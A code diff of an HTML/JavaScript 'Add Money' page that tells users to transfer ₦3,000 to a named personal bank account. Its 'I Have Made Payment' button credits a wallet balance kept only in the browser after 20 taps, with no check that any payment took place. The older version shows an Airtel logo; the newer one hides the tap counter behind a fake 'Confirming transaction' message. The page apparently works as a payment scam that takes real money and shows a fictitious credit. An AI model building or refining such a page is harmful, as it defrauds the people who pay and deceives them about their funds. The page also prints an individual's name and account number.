@@ -6,159 +6,140 @@
   <title>Add Money</title>
   <style>
     body {
+      margin: 0;
       font-family: Arial, sans-serif;
+      background: #fff;
       padding: 20px;
-      background-color: #fff;
-      text-align: center;
-      color: #333;
     }
-
-    .container, .payment-card {
-      max-width: 400px;
-      margin: 60px auto;
-      background-color: #f9f9f9;
+    .card {
+      background: #fff0f0;
+      border: 1px solid #ffd6d6;
       border-radius: 15px;
-      box-shadow: 0 0 10px #ddd;
-      padding: 25px;
-      position: relative;
+      padding: 20px;
+      box-shadow: 0 0 10px #f3caca;
     }
-
-    input {
-      padding: 12px;
-      width: 90%;
-      font-size: 18px;
-      margin-bottom: 20px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
+    .title {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      color: #d90000;
     }
-
-    button {
-      padding: 12px 25px;
+    input[type="number"] {
+      width: 100%;
+      padding: 10px;
       font-size: 16px;
+      margin-bottom: 15px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+    }
+    .btn {
       background-color: #d90000;
       color: white;
       border: none;
+      padding: 12px;
+      width: 100%;
       border-radius: 10px;
+      font-size: 16px;
       cursor: pointer;
     }
-
-    .popup {
-      background-color: #ffe5e5;
-      color: #d90000;
-      border: 1px solid #d90000;
-      padding: 12px;
-      margin-top: 15px;
-      border-radius: 10px;
+    .account-info {
       display: none;
+      margin-top: 20px;
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 15px;
+      padding: 15px;
     }
-
-    .logo-bg {
-      position: absolute;
-      top: 50%;
+    .info-title {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .popup {
+      position: fixed;
+      top: 30%;
       left: 50%;
       transform: translate(-50%, -50%);
-      opacity: 0.03;
-      width: 200px;
-      z-index: 0;
-    }
-
-    .card-content {
-      position: relative;
-      z-index: 1;
-    }
-
-    .success {
-      background-color: #e0ffe0;
-      border: 1px solid green;
-      color: green;
-      padding: 10px;
-      margin-top: 15px;
-      border-radius: 10px;
+      background: white;
+      border: 1px solid #ddd;
+      box-shadow: 0 0 10px #aaa;
+      padding: 20px;
+      border-radius: 15px;
+      text-align: center;
       display: none;
+      z-index: 10;
     }
-
-    .hidden {
+    .overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.4);
       display: none;
-    }
-
-    .progress {
-      font-size: 14px;
-      margin-top: 10px;
+      z-index: 5;
     }
   </style>
 </head>
 <body>
+  <div class="overlay" id="overlay"></div>
+  <div class="popup" id="popup"></div>
 
-  <!-- Step 1: Enter Amount -->
-  <div class="container" id="amountSection">
-    <h2>Enter Amount</h2>
-    <input type="number" id="amount" placeholder="₦ Minimum 3000" />
-    <button onclick="continueToConfirm()">Continue</button>
-    <div class="popup" id="popup">Please input minimum of ₦3000</div>
-  </div>
+  <div class="card">
+    <div class="title">Add Money</div>
+    <input type="number" id="amountInput" placeholder="Enter amount (₦3,000 min)" />
+    <button class="btn" onclick="continuePayment()">Continue</button>
 
-  <!-- Step 2: Confirm Payment -->
-  <div class="payment-card hidden" id="confirmSection">
-    <img src="airtel-logo.png" class="logo-bg" />
-    <div class="card-content">
-      <h2>Send Payment To</h2>
-      <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
-      <p><strong>Bank:</strong> SmartCash PSB</p>
-      <p><strong>Account Number:</strong> 812 489 0070</p>
-      <button onclick="tapConfirm()">I Have Made Payments</button>
-      <div class="progress" id="progressText">Progress: 0 / 20</div>
-      <div class="success" id="successBox">₦3000 has been added to your wallet!</div>
+    <div class="account-info" id="accountSection">
+      <div class="info-title">Send ₦3,000 to:</div>
+      <p><b>Name:</b> EMMANUEL OKWUNNA</p>
+      <p><b>Bank:</b> SmartCash Payment Service Bank</p>
+      <p><b>Account:</b> 812 489 0070</p>
+      <button class="btn" onclick="confirmPayment()">I Have Made Payment</button>
     </div>
   </div>
 
   <script>
-    let taps = parseInt(localStorage.getItem('paymentTaps')) || 0;
+    const overlay = document.getElementById('overlay');
     const popup = document.getElementById('popup');
-    const confirmSection = document.getElementById('confirmSection');
-    const amountSection = document.getElementById('amountSection');
-    const successBox = document.getElementById('successBox');
-    const progressText = document.getElementById('progressText');
+    const accountSection = document.getElementById('accountSection');
+    const amountInput = document.getElementById('amountInput');
 
-    function continueToConfirm() {
-      const amount = parseInt(document.getElementById('amount').value);
-      if (amount >= 3000) {
-        localStorage.setItem('pendingAmount', amount);
-        amountSection.classList.add('hidden');
-        confirmSection.classList.remove('hidden');
-        progressText.innerText = `Progress: ${taps} / 20`;
+    let tapCount = parseInt(localStorage.getItem('tapCount') || '0');
+    let balance = parseInt(localStorage.getItem('balance') || '0');
+
+    function showPopup(message, duration = 2000) {
+      popup.innerText = message;
+      overlay.style.display = 'block';
+      popup.style.display = 'block';
+      setTimeout(() => {
+        overlay.style.display = 'none';
+        popup.style.display = 'none';
+      }, duration);
+    }
+
+    function continuePayment() {
+      const amount = parseInt(amountInput.value);
+      if (!amount || amount < 3000) {
+        showPopup("Please input minimum of ₦3,000", 2500);
+        return;
+      }
+
+      showPopup("Please wait...", 2000);
+      setTimeout(() => {
+        accountSection.style.display = 'block';
+      }, 2000);
+    }
+
+    function confirmPayment() {
+      tapCount++;
+      localStorage.setItem('tapCount', tapCount);
+
+      if (tapCount >= 20) {
+        balance += 3000;
+        localStorage.setItem('balance', balance);
+        localStorage.setItem('tapCount', 0);
+        showPopup("₦3,000 has been added to your wallet!", 3000);
       } else {
-        popup.style.display = 'block';
-        setTimeout(() => popup.style.display = 'none', 3000);
+        showPopup("Please wait... Confirming transaction", 2000);
       }
-    }
-
-    function tapConfirm() {
-      taps++;
-      localStorage.setItem('paymentTaps', taps);
-      progressText.innerText = `Progress: ${taps} / 20`;
-
-      if (taps >= 20) {
-        taps = 0;
-        localStorage.setItem('paymentTaps', 0);
-
-        let user = JSON.parse(localStorage.getItem('user')) || { balance: 0 };
-        user.balance = (parseInt(user.balance || 0) + 3000);
-        localStorage.setItem('user', JSON.stringify(user));
-
-        successBox.style.display = 'block';
-        setTimeout(() => {
-          window.location.href = 'dashboard.html';
-        }, 3000);
-      }
-    }
-
-    // Show previous tap progress if page was refreshed
-    if (localStorage.getItem('pendingAmount')) {
-      amountSection.classList.add('hidden');
-      confirmSection.classList.remove('hidden');
-      progressText.innerText = `Progress: ${taps} / 20`;
     }
   </script>
-
 </body>
 </html>
